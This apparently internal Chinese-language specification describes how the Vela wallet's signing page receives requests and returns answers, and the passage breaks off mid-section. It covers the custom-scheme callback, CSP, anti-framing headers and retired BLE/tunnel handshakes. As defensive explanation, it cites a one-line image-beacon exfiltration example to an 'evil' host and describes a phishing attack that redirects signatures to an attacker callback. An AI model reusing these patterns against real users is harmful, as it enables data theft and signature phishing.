# Vela 签名通道协议 v1

一份请求怎么从请求方到达签名页，答复怎么回去。**一种请求格式**。

> ## ⚠️ 2026-09-23：跨设备通道已全部撤回
>
> 创始人当天先后定下：「客户端支持回环 + 蓝牙就够了，不需要 websocket 隧道」、
> 「我确定砍掉蓝牙」、「web 就不支持可信签名器好了」。
>
> **现在只剩一条通道**：App 把请求放进 URL 片段打开本页（7.2），本页把回答交给
> `velawallet://sign-result`（下面「自定义 scheme 回传」）。回环 WebSocket（7.4）在
> 2026-09-24 也让给了自定义 scheme：发布页的 CSP 连不出去。
>
> 因此以下内容是**历史记录，不是现行协议**，代码里已经没有对应实现：
> **第 1–4 节（BLE 分帧与 GATT）**、**第 7.5 节（隧道）**、以及第 3 节的端到端
> 会话（ECDH/HKDF/AES-GCM）。回环通道是 `127.0.0.1` 上的明文 JSON，靠一次性
> token 和 `Origin` 校验把关。
>
> 撤回的理由只有一句：**只有本设备自己取下来的那份页面，才能和「它应该是什么」
> 对得上**。而这正是可信签名器存在的前提。详见
> `specs/075-clear-signer-channel/spec.md`。
>
> 保留这些章节，是因为它们记录了做过什么、代价是什么；要重新启用，请先读那份
> spec 里「What this costs」。

请求有两类：**签名意图**（dApp 的 EIP-1193 请求、钱包自己的转账，第 4、8 节）和
**钥匙仪式**（创建、登录、证明，第 10 节）。~~可信签名器是和「这台设备 / 手机或平板 /
USB 安全密钥」平级的一条 passkey 通道（创始人，2026-09-22）。~~ **规格 102 起**它是
「在哪里预览并签名」：钥匙仍在那三个地方之一，本页是看清楚再签的地方。钥匙仪式只有
钥匙在自建签名页域名上的钱包才走本页（102 R3）。

~~没有服务器。没有隧道。跨设备走 BLE。~~ —— 2026-09-22 被创始人推翻，2026-09-23
**又走了回来，而且更进一步**：没有服务器，没有隧道，**也没有跨设备**。

---

## 0. 通道选择

| 请求方 | 签名方 | 通道 | 来源可验证 | 一个会话几个请求 |
| --- | --- | --- | --- | --- |
| 同浏览器的网页钱包、Chrome 扩展（**2026-10-30 起现行**） | 本页 | `window.postMessage`（7.1）—— 只答 Vela 自己的钱包：浏览器报告的打开者 origin **恰好是** `https://wallet.getvela.app`、`https://getvela.app` 或 `chrome-extension://bjbdmnmpgcfkocfcfdocopkioacojkhl`（第 12.3 节）；其他打开者的签名一律拒签（规格 102 R7） | ✅ 浏览器背书 | 多个 |
| Safari 扩展（iOS，2026-10-31） | 本页 | 同窗中继（13.5）：没有 opener，Vela 的内容脚本在本页窗口里证明扩展此刻的 origin 并转交；只答证明过的那一个 | 🟡 内容脚本作证（见 13.5 的论证） | 多个 |
| Android / iOS / 桌面 App（**现行**） | 本页 | URL 片段 + `velawallet://sign-result`（7.2 + 下文） | ❌ 自述；一次性 token 证明「是打开本页的那个 App」 | 一个 |
| ~~同机 App~~ | ~~本页~~ | ~~回环 WebSocket（7.4）~~ | **2026-09-24 让给自定义 scheme**；代码留给测试 | |
| ~~任何一端，跨设备~~ | ~~另一台设备上的本页~~ | ~~隧道（7.5）~~ | **已撤回 2026-09-23** | |
| ~~原生 App，跨设备~~ | ~~附近的 Chrome~~ | ~~BLE GATT（1–4）~~ | **已撤回 2026-09-23** | |

三个 App 走 URL 片段 + 自定义 scheme（上表第二行）。**网页钱包与 Chrome 扩展走 postMessage**
（上表第一行）：2026-10-29 先只为多签成员的批准，**2026-10-30 起创始人定下签名页在网页上处处可用** ——
账户的「签名方式」选了签名页，网页钱包与扩展里的每一笔交易、批量、钱包自己的发送、`personal_sign`、
`eth_signTypedData_v4` 与多签批准都交到这一页（vela-core `signing_venue::signing_route`，第 13 节）。
扩展端口那一行在 2026-09-23 随扩展形态一起撤回（7.3）—— 现在的扩展是钱包本身（`app-web/vela-wallet/extension`），
它用 `window.open` 打开本页，和网页钱包一样走 postMessage。

### 自定义 scheme 回传 —— 已实现（2026-09-24）

签名结果经 `velawallet://sign-result?t=<一次性token>&result=<base64url JSON>`
（或 `…&error=<code>`）交回 Android / iOS / 桌面。**这是现在唯一的通道**：创始人
2026-09-24 定下「回环 WebSocket 不做呀，现在就是纯 custom schema」。

**它不是新机制。** 核心里的 `url_launch(base, request, callback, token)` 与
`parse_callback(query, token)` 就是这个形状，只是把 `callback` 从
`http://127.0.0.1:<port>/…` 换成 `velawallet://sign-result`；一次性 token 的校验
原样适用。三端各自收到 URL 后，**先问核心这是谁的**
（`trusted_signer::callback_token`），再交给核心去读、去判。

**为什么它取代了回环，而不是补充回环。** 两条都是量出来的，不是偏好：

- 发布出去的那一页把 `default-src 'none'` 写在**被哈希的字节里**（规格 076），
  所以一个哈希对得上的页面**根本开不出 WebSocket** —— 真浏览器实测，在监听的
  服务器一个字节都没收到。而**导航到自定义 scheme 不受该 CSP 管辖**，同样实测。
- 手机 App 在浏览器标签盖上来的那一刻就被挂起，本来也接不到回环连接。系统却能把
  一个 scheme 交给被挂起的 App。

**它给不了什么。** 自定义 scheme 不是独占的：谁都能注册 `velawallet://`，
Android 上是 intent filter 冲突，iOS 上哪个 app 胜出未定义 —— 所以**恶意 app
能截走回调**。后果要分清：

- **完整性不受影响**：`verify()` 只接受「对钱包自己算出的那个摘要」所做的
  `webauthn.get`，凭据还必须是本钱包持有的。伪造的回调进不来。
- **可用性受影响**：被截走就是钱包永远等不到。
- **机密性受影响**：对方拿到断言，可以抢先替人提交那笔他自己的交易。骚扰，不是
  盗币。

因此它是**传输，不是授权依据**。

**一次访问一个请求。** URL 只装得下一个请求，所以 075 的「一个流程一次访问」在
这条通道上不成立：创建之后的成员证明是**第二次访问**，带**第二个一次性 token**。
把两个请求算作一个流程的是钱包这一侧，不是通道。

**回调是事件，不是导航。** 客户端收到它时，必须**不改变当前路由，也不动当前
状态**：

| | 承接点 | 实测 |
| --- | --- | --- |
| Android | 专用的 `SignResultActivity`（透明、不入最近任务、收完即结束） | Pixel 7 / API 34：Custom Tab 压在钱包上时，答复送达、`MainActivity` **同一个实例**未重建（探针 P3，连跑 3 次） |
| iOS | `RootView.onOpenURL` → `TrustedSignerCallbacks.deliver` | 754 项单元测试绿 |
| 桌面 | macOS `on_open_urls`；Win/Linux 冷启动扫 argv | macOS 端到端跑通 |

**Android 为什么要一个自己的 Activity**：`MainActivity` 是 `singleTop`，而
Custom Tab 就压在它上面、同一个 task 里。`singleTop` 只在目标已经在栈顶时复用，
所以一个指向 `MainActivity` 的 VIEW intent 会在标签页之上**再建一个
`MainActivity`** —— 一个全新的 App，流程那一屏没了。把 `MainActivity` 改成
`singleTask` 能解决，代价是为了一个回调改掉整个 App 的 task 行为。

一句话的规则：**回调带一次性 token，它只解决那一个待答复的请求；没有待答复的就
静默丢弃** —— 不弹错、不跳页。

### 谁可以让本页创建钥匙（2026-09-24 改）

**规则从「谁在请求」改成「答复去哪里」。**

原先只有 app 通道（回环 / 隧道 / BLE）和浏览器作保的 `getvela.app` 源，才算
「是 Vela 钱包在请求」；创建钥匙和成员证明只对这两者开放。回环一砍，客户端只剩
url 通道，而 url 通道上**没有任何东西能证明是谁打开了这一页** —— 于是创建钱包
被直接拒掉。创始人当天就撞上了：「创建钱包时，滑动签名不可用，无法滑动」。

现在的规则：**`cb` 是钱包自己的地址，才允许创建钥匙和成员证明。**（2026-10-09 起
比较的是整串 `velawallet://sign-result`，不只是 scheme，并且对签名和每一种仪式都适用
—— 见下一节。）理由是这一条能站住：

- 想拿到本页创建的钥匙，就得**收得到**答复，就得把 `cb` 写成自己能收的地址；
- 写成 `velawallet://`，钥匙就交给了 Vela 钱包，对他没用；
- 写成自己的，本页拒绝 —— 卡片上写的也是这个理由：「答复到不了 Vela 钱包」。

绕开它只有一条路：在设备上抢注 `velawallet://` 并赢下冲突。那正是这条传输本来
就写明的上限（见上），页面对此无能为力。

**卡片说的是目的地，不是请求方。** 本页不知道是谁打开它的，所以不再画请求方
自报的名字和图标 —— 创始人：「这个页面展示的『某个钱包』logo、无法确认身份的
请求方，感觉不太合适」。现在写的是**本页将要做的事**：「Vela 钱包 · 答复只交回
给它」（2026-10-09 前是「Vela 钱包 · 答复交回本机的 Vela 钱包」，钱包说了两遍），
或者目的地的 scheme。前者可以被人核对，后者是事实。

### 答复只交给钱包，页面不进框架（规格 102 R7，2026-10-09）

**签名也按「答复去哪里」来判，而且只有一个合格的地址：`velawallet://sign-result`。**

这条规则原先只管创建钥匙和成员证明；签名对任何打开者、任何答复地址都照签。
于是钓鱼站可以打开**真的** `sign.getvela.app/b/<hash>/sign`，带上自己拼的操作
（比如把账户里的 USDC 全转走）和自己的 `cb=https://attacker…`：卡片在 Vela 的真
域名上如实描述那笔操作，人一滑，攻击者就拿到一份能用的签名。postMessage 同理
（谁 `window.open` 了本页，答复就回给谁）。`samples/answer-test.mjs` 在 0ba8ee8c 及
之前的每一版上都能复现：evil.example 收到账户钥匙对攻击者 SafeOp 的有效签名。

现在（`resolve.answersToWallet`，签名、仪式、发送三处共用这一个函数）：

- **只有 url 通道、且 `cb` 恰好是 `velawallet://sign-result`**，答复才算交给钱包。
  比较的是整串，不是 scheme：`velawallet://open?url=…` 也是钱包，答复拼在它后面
  会被带去那个链接打开的页面。
- 签名不满足这一条 → 卡片拒签（按钮置灰、不弹 passkey），并写明答复本来要去哪里
  （`refuse.answerElsewhere`，或 `refuse.answerNotToWallet`）。postMessage 上的签名
  一律拒签，哪怕打开者是 `*.getvela.app`；打开者只会收到 `{vela:'error', code:'refused'}`。
- url 通道上的**每一种**仪式同样如此（不再只是创建与成员证明）：答复送不到，登录、
  证明弹出 passkey 也没有意义。
- `lib/intake.js` 在发出去的那一刻再按同一规则检查：不合格的地址**什么都收不到**
  —— 没有答复、没有拒签码、关页时也没有信标。
- **规则判不出来就是拒**：上下文里没有通道、没有地址，都算不合格（预览和测试要
  按 App 的样子带上 `channel: 'url', callback: 'velawallet://sign-result'`）。请求方
  在 `context` 里自己写的 `channel` / `callback` 照旧被通道的事实覆盖。

**测试例外，只在测试页里。** 桌面演示（`samples/desktop-demo.mjs`）的手动模式开的是
人自己的默认浏览器，`velawallet://` 会交给装好的 Vela 而不是演示进程，所以它要在
本机回环上收答复。它打开的是 `samples/loopback-sign.html`：`src/sign.html` 的全部脚本
再加 `samples/loopback-answer.js`（把规则放宽到 `http://127.0.0.1|localhost:<port>/…`）。
这个文件在 `src/` 之外，`build-single.mjs` 只读 `src/sign.html` 点名的文件，所以
**发布出去的页面里没有它**；`answer-test.mjs` 每次都核对：发布页拒绝回环地址、字节里
没有这段代码、测试页的脚本清单就是 `src/sign.html` 的清单加这一个文件。其余自动化
测试不需要例外：它们用 `velawallet://sign-result`，经 DevTools 的
`Page.frameRequestedNavigation` 截到页面发往钱包的那次导航。

**不进框架。** 框架里的页面可以被外层网页盖住、改写、在确认按钮的位置放一个它自己的
按钮，而 passkey 弹窗照样写着 Vela 的域名。所以：

- 托管方对所有路径发 `Content-Security-Policy: frame-ancestors 'none'` 和
  `X-Frame-Options: DENY`（`dist/_headers`，由 `build-single.mjs` 的 `HEADERS` 生成）。
  `frame-ancestors` 必须是响应头 —— 写在页面自己的 `<meta>` CSP 里浏览器会忽略。
  响应头不在版本的哈希里，所以部署后对旧版本同样生效。
- 页面自己再查一次：`window.top !== window.self` 就什么都不做 —— 不读片段、不画卡、
  不应答，只说一句「本页不能嵌在别的网页里使用」。这一条管的是不发这些响应头的托管
  方和不认它们的浏览器。

### 钥匙路线、确认按钮、页面自己那一行（规格 102 第 3 阶段，2026-10-09）

**钥匙路线（R5）。** 钱包告诉本页这笔签名用哪一把钥匙、它在哪里，浏览器就直接去找它，
不再弹「这台设备 / 用手机扫码 / USB 安全密钥」那个通用选择框 —— 那个问题人在钱包里
已经回答过了。签名请求的 `context` 多一项（vela-core `trusted_signer::request`）：

```json
"allowCredentials": ["<那一把钥匙的 id>"],
"keyRoute": { "credentialId": "<base64url>", "place": "platform", "transports": ["internal","hybrid"], "hints": ["client-device"] }
```

| `place` | 页面上写 | `hints` | 没给 `transports` 时 |
| --- | --- | --- | --- |
| `platform` | 这台设备 | `client-device` | `internal` |
| `hybrid` | 手机或平板 | `hybrid` | `hybrid` |
| `security_key` | USB 安全密钥 | `security-key` | `usb`, `nfc` |

- `resolve.keyRoute` 逐项检查：id 必须是合法的 base64url，且在 `allowCredentials` 里
  （不在 = 当作没给路线）；未知的 `place` / `transport` / `hint` 一律丢掉。路线只会**收窄**
  浏览器的选择：答复回来照旧要是这个账户的钥匙（`sign.js`），钱包照旧再验一遍。
- 有路线：`navigator.credentials.get` 的 `allowCredentials` 只有这一把，带它注册时报告的
  `transports`，外加 WebAuthn L3 `hints`。没有路线（旧钱包）：和以前一字不差 —— 只有 id，
  不带 transports、不带 hints。
- 钥匙仪式（10.4）用同样的 `place` / `hints` / `transports`；创建另外设
  `authenticatorSelection.authenticatorAttachment`（`platform` → `platform`，其余 → `cross-platform`）。
- 卡片在「签名账户」下面写一行「确认方式：这台设备」（仪式里是「新钥匙存在」）。

**确认是一次点按。** 滑块没了，和各 App 一样是一个按钮，上面写动作（确认发送 / 授权 /
签名 / 登录 / 创建钥匙……，由 `resolve` 的 `confirmKey` 决定）。**WebAuthn 调用必须在点按的
事件处理函数里同步发起**：Safari 只把 passkey 弹窗给「人手势里正在运行的代码」，中间隔一个
`await` 或定时器就没了（`samples/confirm-test.mjs` 在调用那一刻核对
`navigator.userActivation.isActive`）。等待 passkey 时按钮保持原色、转圈、不再接受第二次
点按；本页拒签时按钮置灰，写「不能签」；签完写「完成」。自动化钩子名不变：
`window.__slider` 指向那个按钮，`__confirm()` / `__reset()` 照旧。

**代币与网络来自 vela-core 自己的表。** `src/lib/catalog.js` 由 `samples/gen-catalog.mjs`
从 `app/network_admin.rs`（内置网络）和 `app/token_registry/table.rs`（代币）生成，按**链**
查：同一个地址换一条链就不是那个代币。以前这里只有一张手写的主网表，Base / Arbitrum 上的
USDC 都成了未知代币，按猜的 18 位小数读成「0 ?」。本页不认识的代币，金额按最小单位**原样**
显示整数，并挂一条「小数位数无法核实」，绝不再猜小数位。

**页面自己那一行。** 签名面板下面一行小字：「Vela 签名页 · 版本 f14e755a · 零依赖 · 开源 · 可自建」。
版本是**本页地址里** `/b/<sha256>/` 的前 8 位 —— 钱包交接卡上显示的也是这 8 位，人能对得上。
它是标签，不是证明：页面没法为自己的字节作保（076），证明是钱包打开之前做的那次核对。
从根地址打开（没有哈希）就不写版本。

**十五种语言，全部编进被哈希的字节里**（`src/lib/locales/*.js`，各 App 的十五种）。
选哪一种和 App 用同一条规则（vela-core `match_system_tag`，`samples/locales-test.mjs` 直接读
核心测试里的向量来对）：`?lang=` → 浏览器的语言列表 → 英文。**不再记住**：以前存在
`localStorage` 里的选择会压过设备后来改的语言，而所有签名页共用一个源。

### 这一页发不出网络请求（规格 076）

发布出去的是单文件页，`default-src 'none'` 就写在**被哈希的那串字节里**，所以
一个哈希对得上的页面**在结构上就发不出请求**。真浏览器实测 10/10：`fetch`、
XHR、`sendBeacon`、WebSocket、远程图片，没有一个够得到在监听的服务器。

**远程图片算网络请求，而且正是最典型的外泄通道**——`img.src = 'https://evil/?secret='`
一行就把交易内容送走了，连响应都不需要。所以 CSP 是 `img-src data:`：只允许内联
的 data URI（它们本来就在被哈希的字节里）。代价是链/代币 logo 取不到，页面退回
画首字母；identicon 本来就是本地算的，不受影响。

字体同理：`font-src data:`。页面用 App 的字体 Plus Jakarta Sans（2026-10-09 起，页面
照 App 内签名面板的样子画——同一套颜色、字号、间距，值抄自 App 的 `tokens.css`），
三个字重的子集以 data URI 写在 `src/fonts.css` 里，也就在被哈希的字节里，约 47 KB
（`samples/gen-fonts.mjs` 从 `assets/fonts/` 生成，构建本身不跑它）。西里尔字母和
中日韩文字 App 的 Jakarta 本来也没有，交给系统字体，和 App 一样。

---

## 1. GATT 布局

原生 App 作为 peripheral 广播：

| | UUID | 属性 |
| --- | --- | --- |
| 服务 | `76656c61-0001-4000-8000-00805f9b34fb` | — |
| `c2p` 中心端 → 外设 | `76656c61-0002-4000-8000-00805f9b34fb` | `write`, `writeWithoutResponse` |
| `p2c` 外设 → 中心端 | `76656c61-0003-4000-8000-00805f9b34fb` | `notify`, `read` |

（`76656c61` 是 ASCII 的 `vela`。）

广播里必须带服务 UUID —— Chrome 的设备选择器按它过滤。建议同时带一个人能读的
本地名（例如 `Vela · 张三的 iPhone`），用户要在选择器里认出自己的设备。

> **iOS 提醒**：App 退到后台后，广播会丢掉本地名、服务 UUID 进 overflow 区，
> 桌面扫描器基本看不见。签名期间 App 必须在前台。

---

## 2. 分帧

BLE 一次写不了几百字节，而一个批量意图可以有几 KB。每条消息切成帧，
**6 字节帧头**：

```
偏移  长度  含义
0     1     flags —— bit0: 1=已加密, 0=明文（仅握手用）
1     1     msgId —— 同一条消息的所有帧相同，0-255 循环
2     2     seq   —— 帧序号，从 0 开始，big-endian
4     2     total —— 本条消息共几帧，big-endian
6     …     载荷
```

接收方按 `msgId` 归拢，收齐 `total` 帧后拼接。乱序要能容忍，
超时（建议 10 秒）未收齐就丢弃整条并回 `error`。

单帧载荷默认 **244 字节**（对应常见的 ATT MTU 247）。写失败就减半重试，
最低降到 20 —— 老设备的默认 MTU 就是 23。

> **244 不等于整帧。** 加上 6 字节帧头是 250 字节，而 MTU 247 的 ATT 值只能装
> 244。中心端（页面）这么写没事：系统会拆成 long write。外设的 **notify 不能拆**
> —— `updateValue` 会按链路上限**截断**，而截断的帧就是一条永远拼不齐的消息
> （iOS 外设，075 T041 发现）。所以外设在中心端订阅、拿到 MTU 之后，应当按
> `mtu - 3 - 6` 重新定尺寸（`vela_core::trusted_signer::ble::Framer::fit_to_mtu`，
> 三端共用），而不是沿用默认值。

---

## 3. 握手：ECDH + 数字比对

BLE 自身的链路加密在各家实现上参差不齐，隧道又不该看见任何东西，所以**我们自己加密**，
用的全是浏览器内建的 WebCrypto（P-256 ECDH + HKDF + AES-GCM），零依赖。

BLE 和隧道跑**同一份会话代码**：页面这边是 `lib/transport/secure.js`，钱包那边是
vela-core 的 `trusted_signer::secure`（Rust）。**标签是参数**：BLE 用 `vela-ble/1`，
隧道用 `vela-tunnel/1`（下文写作 `<label>`）。两边由
`rust/crates/vela-core/tests/clear-signer/secure-session.json` 的向量钉死
（`node samples/secure-vectors.mjs`，Node 与 Chrome 各跑一遍）。

1. 中心端连上后，明文（`flags=0`）写出：

   ```json
   {"v":1,"t":"hello","role":"signer","pk":"<base64url, P-256 raw 公钥 65 字节>","nonce":"<base64url 16 字节>"}
   ```

2. 外设明文回：

   ```json
   {"v":1,"t":"hello","role":"requester","pk":"…","nonce":"…","app":"vela-ios/0.1"}
   ```

3. 双方各自算：

   ```
   shared = ECDH(自己的私钥, 对方公钥)                    // 32 字节
   salt   = nonce(中心端) ‖ nonce(外设)
   key    = HKDF-SHA256(shared, salt, "<label> key",  32)
   code   = HKDF-SHA256(shared, salt, "<label> code",  4)
   ```

4. **比对码** = `code` 前 4 字节按 big-endian 取模 `1000000`，补足 6 位十进制。
   两端同时显示，用户确认一致后才继续。

   这一步不是仪式感：它是中间人攻击唯一的拦截点。攻击者能各自和两端完成 ECDH，
   但两端算出的比对码不会相同。**没有比对码的 BLE 通道等于明文广播里的一次转账。**

5. 之后所有帧 `flags=1`，载荷是 `12 字节 IV ‖ AES-GCM 密文`：

   ```
   IV  = 4 字节方向标签（"C2P." / "P2C."）‖ 8 字节计数器（big-endian，每方向各自从 1 递增，绝不重用）
   AAD = "<label>|" ‖ 方向("c2p"/"p2c") ‖ "|" ‖ 尾巴
         尾巴：BLE 是这条消息帧的 msgId；隧道是 IV 里的计数器（十进制）
   ```

   `c2p` 是签名页 → 钱包，`p2c` 是钱包 → 签名页（BLE 的叫法：页面是 central）。
   **打开时**：IV 的方向标签必须是对方的，计数器必须大于已打开过的每一个 ——
   重放、乱序、自己方向的消息一律拒绝、不解密（与 Rust 一致）。

   明文是 UTF-8 的 JSON（第 4 节）。每条消息带 `n`（单调递增序号），
   收到不递增的 `n` 一律丢弃 —— 防重放。

---

## 4. 消息

握手之后，加密载荷里的 JSON：

**外设 → 中心端：请求签名**

```json
{
  "v": 1, "t": "intent", "n": 1,
  "id": "e6f3…",
  "intent":  { "method": "eth_sendTransaction", "params": [ … ], "origin": "https://app.uniswap.org" },
  "context": { "chainName": "Ethereum", "dapp": {…}, "fee": {…}, "simulation": {…}, "seenAddresses": [ … ] },
  "expires": 1788750000
}
```

`intent` 就是 EIP-1193 的请求对象，一个字不改 —— 和其它三种通道完全同构。
`context` 是签名页渲染需要、但意图本身没有的事实（链名、费用报价、模拟结果、
通讯录）。**签名页不会修改其中任何一项**：意图到达即定死，只有签或不签。

**中心端 → 外设：结果**

```json
{"v":1,"t":"result","n":2,"id":"e6f3…","signature":"0x…","account":"0x88cC…6894"}
{"v":1,"t":"error", "n":2,"id":"e6f3…","code":"user_rejected"}
```

`code` 取值：`user_rejected`（用户没有确认）、`expired`（超过 `expires`）、
`unsupported`（方法不认识）、`refused`（本页规则拒签，例如对整个 NFT 合集的授权、自带挑战码、
账户对自己改所有者或模块、delegatecall、`SafeTx`）、
`unavailable`（本页需要的服务没应答；发布页连不出网络，成员证明也不再问注册表，现在用不到）。

钥匙仪式的答复形状不同（第 10.3 节）：字段直接放在信封顶层，不包在 `result` 里。

**`n` 怎么取**：发送方取「自己发过的最大 `n` 与收到过的最大 `n`」中较大者加一。
这样每一方自己的序号递增，整个会话的序号也递增（intent 1、result 2、intent 3……，
与 Rust 向量一致）；接收方只看对方的 `n` 是否递增。

**任意方向：挂断**

```json
{"v":1,"t":"bye","n":9,"reason":"done"}
```

钱包发 `bye` = 会话正常结束。页面空闲 5 分钟也会发 `bye`（`reason:"idle"`）后断开。

---

## 5. 这个通道保证什么、不保证什么

**保证**
- 内容对射频窃听者不可读（AES-GCM），且被篡改会被 GCM 认证标签发现。
- 有中间人时比对码不一致 —— 前提是**用户真的看了**。
- 攻击者必须在射频范围内。相比二维码 + 隧道，截屏钓鱼这条路被切断了。

**不保证**
- **请求方身份**。BLE 上没有任何东西能证明"这是 Uniswap"。`intent.origin` 是
  请求方自述的，签名页会明确标注「站点身份由请求方自述」。
- **不会误签给另一台自己的设备**。这正是比对码要用户看的原因。

---

## 6. 实现清单

| 端 | 角色 | 状态 |
| --- | --- | --- |
| Chrome 扩展页 / 签名页 | central | `lib/transport/ble.js`（分帧）+ `lib/transport/secure.js`（会话）—— 已实现，`samples/ble-loopback.mjs` 10/10 通过 |
| 桌面 App（Rust） | peripheral | 待做 |
| iOS App（CoreBluetooth `CBPeripheralManager`） | peripheral | 待做 |
| Android App（`BluetoothGattServer`） | peripheral | 待做 |

三个原生端实现同一份第 1–4 节即可，互不依赖。
`samples/ble-peripheral.mjs` 是可运行的参考外设（Node），照它抄最省事。

**已验证的部分**（`node samples/ble-loopback.mjs`）：握手先后顺序、两端算出同一个
六位比对码、32 帧的分片重组、**乱序到达**仍能拼回、意图字节级一致、渲染出正确的
签名卡、来源被判为不可验证、签名加密回传、重放的消息被丢弃。

**还没验证的部分**：真实射频。Chrome 的 `BluetoothEmulation` 是实验域，在 151 上
走到设备选择器就停住（不发 `gattOperationReceived`），所以 Web Bluetooth 绑定本身
必须拿真手机 + 真电脑测 —— 这一步没有替代品。

---

## 7. 另外三种通道的线格式

意图与结果的形状和第 4 节完全一致，只是信封不同。

### 7.1 postMessage（同浏览器，来源可验证）

dApp `window.open` 打开 `https://sign.getvela.app/sign.html?ch=post`，然后：

```js
// 签名页 → 打开它的窗口（脚本就绪时）
{ vela: 'ready', v: 1 }
// dApp → 签名页
{ vela: 'intent', id: '…', intent: {…}, context: {…} }
// 签名页 → dApp
{ vela: 'result', id: '…', result: {…} }
{ vela: 'error',  id: '…', code: 'user_rejected' }
```

**意图不要放在 URL 里**：先开空页面再 post，既没有长度上限，又能拿到浏览器填的
`event.origin`。两边都必须核对对方 origin —— 参考 `samples/dapp-sim.js`。

**签名意图在这条通道上只答 Vela 自己的钱包**（规格 102 R7，第 12.3 节；2026-10-30 起不只多签批准）：
答复回给打开者，而任何网站都能打开本页 —— 所以打开者 origin（浏览器填的 `event.origin`）必须**恰好是**
网页钱包或已发布扩展的 origin，否则打开者只收到 `{vela:'error', code:'refused'}`。钥匙仪式照旧按第 10.2 节。

**一个会话多个请求**（第 11 节）：第一条 intent 必须来自 `window.opener`，之后只听这个窗口、
这个 origin；答完一个继续等下一个，直到对方发 `{vela:'bye'}`、关窗或空闲 5 分钟。
参考 `samples/wallet-sim.js`。

### 7.2 URL 片段 + 回调链接（原生 App，无服务器）

> 现行的回调是 `velawallet://sign-result`（上文「自定义 scheme 回传」），而且发布页
> **只**答复这一个地址（规格 102 R7）。下面的 `http://127.0.0.1:<port>/vela` 是最早的
> 桌面形状，现在只有测试页 `samples/loopback-sign.html`（`samples/desktop-demo.mjs`
> 用它）还接受。

App 用系统能力打开浏览器：

```
https://sign.getvela.app/sign.html?ch=url#i=<base64url(JSON)>&cb=<base64url(回调URL)>&t=<一次性token>&z=1
```

这条通道**任何网页都能打开**，所以它从来不算「钱包通道」：从这里来的创建钥匙、成员证明
一律拒绝（第 10.2 节）。`i` 是 `{"intent":{…},"context":{…}}`；`z=1` 表示先经过 `deflate-raw`
（浏览器内建 `DecompressionStream`，仍是零依赖，十六进制 calldata 通常压到三分之一）。
片段整体建议压在 8KB 内。

回程是**顶层跳转**（不是 fetch，避开混合内容与 PNA）：

```
http://127.0.0.1:<port>/vela?t=<同一个token>&result=<base64url(JSON)>
http://127.0.0.1:<port>/vela?t=<同一个token>&error=user_rejected
```

签名页加载后立刻 `history.replaceState` 抹掉片段 —— 一次性 token 不该留在历史里。
`t` 由 App 生成并核对，防止本机另一个程序冒充答复。

**拒签必须用 `navigator.sendBeacon`，不能用导航。** 页面正被关闭时已经不能再导航，
而"关掉即拒绝"正是本产品唯一的拒绝方式 —— 用导航实现，这个承诺会静默落空。
成功签名走导航（页面还活着），拒签走信标。

错误码分两种，对请求方意义完全不同：`refused`（**签名页的规则**拒绝了它，例如对整个
NFT 合集的授权、操作与请求不符、会交出账户的调用）与 `user_rejected`（**人**没有点确认）。
无限额授权与 permit 不在此列：2026-09-26 起标红、可原样签。

可运行的参考实现：`samples/desktop-demo.mjs`。

### 7.3 扩展端口 —— 已移除（2026-09-23）

曾经有第三条通道：签名页同时是一个 Chrome MV3 扩展，我们自己的 https 页面
（`externally_connectable` 白名单内）连一个端口把意图递进去。

它的唯一调用方是 **web 钱包**。规格 075 把可信签名器从 web 钱包整个砍掉之后，
这条通道再没有人用，于是扩展形态本身也一并移除（owner：可信签名器只在
Android / iOS / 桌面客户端上，页面开在本机自己的浏览器里）。

移除它还解开了一个约束:MV3 禁止内联 `<script>`,而规格 076 需要签名页是
**单个文件** —— 这样一个哈希就覆盖了全部可执行字节。

### 7.4 回环 WebSocket（同机 App，071 起；075 起一个会话多个请求）—— App 已不用（2026-09-24）

App 在 `127.0.0.1` 上监听，用自己的浏览器标签页（Custom Tab / SFSafariViewController）打开：

```
https://sign.getvela.app/sign.html?ch=ws#p=<port>&t=<一次性token>
```

```
页面 → 升级请求，Origin = 签名页的 origin（别的 origin 在握手时就被拒）
页面 → {v:1, t:"hello", token}                  token 不对 → App 关掉，继续等
App  → {v:1, t:"intent", id, intent, context}
页面 → {v:1, t:"result", n, id, result:{…}}      签名意图（071 的形状）
     | {v:1, t:"result", n, id, registration|assertion, origin}   钥匙仪式（第 10.3 节）
     | {v:1, t:"error",  n, id, code}
App  → 下一条 {t:"intent"}（新 id，同一个 socket）…
App  → {v:1, t:"bye", reason:"done"} + 关闭帧        会话结束
```

不带 `bye` 直接关掉 socket 也算会话结束；请求还没答时关掉 = 那一个请求作废。
片段在页面加载后立刻抹掉。可运行参考：`samples/test-kit.mjs` 的 `loopbackWallet`。

### 7.5 隧道（跨设备，075）

钱包生成房间号和一把静态 P-256 密钥，显示二维码 + 可复制的链接：

```
https://sign.getvela.app/sign.html?ch=relay#relay=<wss URL，percent 编码>&room=<22 位 base64url>&rk=<22 位 base64url>&v=1
```

> `ch=relay`、片段键 `relay`、以及隧道自己的帧键 `"relay"`，都保留改名前的写法
> （2026-09-23 创始人把这个服务改叫 tunnel/隧道）。它们是**线上协议**：已经部署的
> 页面、已提交的 wasm、以及独立仓库 `vela-tunnel` 里的三个宿主 crate 都按这个拼法
> 读写。唯一随改名动过的线上取值是 HKDF 标签 `vela-tunnel/1`——它的两端都在本仓库
> 里，可以一起改。

- `rk = b64url(SHA-256(钱包公钥)[0..16])`。
- 页面从片段读出（片段不发给任何服务器，读完立刻抹掉），连 `<tunnel>/v1/rooms/<room>?role=signer`。
- 隧道 URL 只接受 `wss:`，或本机回环上的 `ws:`。
- 隧道发来 `{"v":1,"relay":"joined"}` 后，页面发明文 hello（文本帧），钱包回 hello；
  **钱包公钥哈希对不上 `rk` → 页面拒绝**：不算比对码、不发任何加密帧、离开房间
  （这挡住隧道或猜到房间号的人冒充钱包）。
- 对上了 → 双方显示同一个**六位码**，人在钱包上确认后钱包才发请求（这挡住冒充页面的人，
  对「创建钥匙」尤其要紧：冒充的页面会塞给钱包一把别人的钥匙）。
- 之后每条消息是一个二进制帧 `IV(12) ‖ AES-GCM`（第 3 节，`vela-tunnel/1`，AAD 尾巴是计数器），
  没有 BLE 分帧。明文 JSON 与第 4 节相同。
- 钱包掉线（`{"relay":"left"}`）：屏幕上那个请求作废（不再能确认，也不会答复），页面等它回来；
  再次 `joined` 时从头握手（新密钥、新 nonce、新比对码，`rk` 再查一遍）。
- 比对码画在等待卡和会话里的**每一张卡**上。
- 隧道关闭码：4408 过期/空闲、4409 角色已占、4400/1009 请求不对 —— 页面各有说法。

参考：`lib/transport/tunnel.js`；房间规则的模拟实现 `samples/mock-tunnel.mjs`（真隧道是 Rust，
